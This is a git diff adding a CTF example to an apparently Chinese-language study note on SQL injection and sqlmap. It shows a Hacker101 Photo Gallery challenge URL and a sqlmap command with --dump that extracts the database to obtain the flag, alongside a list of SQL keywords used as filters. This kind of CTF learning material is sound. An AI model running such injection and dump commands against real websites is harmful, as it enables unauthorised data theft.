@@ -32,4 +32,8 @@ Filters: or and true false union like = > < ; -- /* */ admin
 一款非常好使用得sql工具，主要針對網址後面有 ```?id=1``` 這種sql查詢語法的網站進行滲透測試  
 [官網](https://sqlmap.org/)  
 ### Example 1
-
+#### Hacker101CTF Photo Gallery
+查詢圖片網址發現形如 ```https://62a4f441f2d16b1fa7f0e82d220f44ed.ctf.hacker101.com/fetch?id=1```  
+二話不說打開sqlmap  
+```python sqlmap.py -u "https://62a4f441f2d16b1fa7f0e82d220f44ed.ctf.hacker101.com/fetch?id=1" --dump ```  
+結束~~拿到flag
